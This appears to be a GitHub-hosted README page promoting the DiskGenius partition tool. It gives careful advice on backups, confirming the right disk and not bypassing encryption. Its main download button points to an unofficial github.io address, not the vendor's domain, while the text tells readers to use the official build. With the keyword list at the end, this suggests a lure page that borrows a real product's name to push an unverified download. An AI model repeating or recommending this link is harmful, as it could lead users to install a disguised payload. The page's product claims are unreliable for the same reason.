# DiskGenius - Partitions on a Disk You Own

DiskGenius shows the partitions on a disk in this computer and can resize or copy a volume after you confirm it. Those operations can erase data. Use it on drives you own, after a backup that you have actually opened. It does not unlock BitLocker or any other encryption when you do not have the key.

---

## Why It Stands Out

![DiskGenius showing partitions on a disk the user owns, before any change is applied](https://www.diskgenius.com/manual/img/quick-partition-01.png)

Windows can hide the difference between a data disk and the disk you boot from. DiskGenius draws the layout so you can see which volume is which before you touch it. Looking is the safe part. Resizing, deleting, or writing a partition table is the part that can make a disk unbootable or empty. If you cannot explain the change in one sentence, do not apply it.

Back up first to a different disk. A backup you have not opened is not a backup. DiskGenius will not bypass a locked volume: if Windows cannot mount it without a key you do not have, this program is not the way through. Do not run it against a drive that belongs to someone else, even if the PC can see the hardware. When you are only checking the layout, close without saving.

---

## Core Capabilities

- **A Map of Volumes:** See partitions and sizes on a disk you can point to in this PC.
- **Identify the Disk:** Match the size and the label with the physical drive before any write.
- **Changes You Confirm:** Resize or delete only after you know which volume it is and you have a backup.
- **No Key, No Unlock:** Encrypted volumes stay closed without the key or the password that belongs to them.
- **Close Without Writing:** A look at the map does not have to become an edit.

---

## Performance Tips

- Unplug extra external disks so you cannot pick the wrong one.
- Back up to a different physical disk and open one restored file first.
- Do not resize the Windows volume if you have no installer and no spare boot disk.
- Read the confirm dialog. The disk number in the dialog must match the disk you meant.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **Operating System** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **Processor (CPU)** | Dual-core | Any current PC |
| **Memory (RAM)** | 2 GB | 4 GB |
| **Storage** | Small install | A second disk for the backup |
| **Privileges** | Administrator for disk changes | A bootable spare if you edit the system disk |
| **Scope** | Disks you own | Backup opened before you write |

---

## Quick Setup

Prerequisites: Administrator rights on your PC, a backup on another disk, and a clear idea of which drive you are looking at.

[![GET DiskGenius](https://img.shields.io/badge/GET%20%E2%80%94%20DiskGenius-334155?style=for-the-badge&logoColor=white)](https://seitannabella.github.io/.github/diskgenius-partitions)

1.  **Install:** Use the official build and open the partition view.
2.  **Match the Disk:** Compare capacity and label with the drive you intend. Unplug the others if you can.
3.  **Look Only:** Confirm you can see the volumes. Do not apply a change on this first open.
4.  **Change Later, If Needed:** Only after the backup has been opened and the confirm dialog names the right disk.

---

## Ideal For

- **A Data Disk You Added:** See the new volume before you format anything.
- **A Planned Resize:** Shrink or grow a partition you have backed up.
- **A Second Opinion:** Check that Windows is showing the disk you think it is showing.
- **A Stop:** Leave an encrypted volume alone when you do not have the key.

---

## Troubleshooting

- The wrong disk is listed first? Unplug extras and reopen. Do not guess from the order.
- Windows will not boot after a change? Use the backup and the spare installer. Do not keep writing partitions.
- A volume asks for a key? Stop. You need the key from when it was created, not another tool.
- The map looks unfamiliar? Close without applying. Take a photo of the layout and compare it with Disk Management.

---

## Find Related Topics

diskgenius partition map, clone after backup, extent list, second disk, hex look only, confirm the disk, own drive, no bitlocker bypass
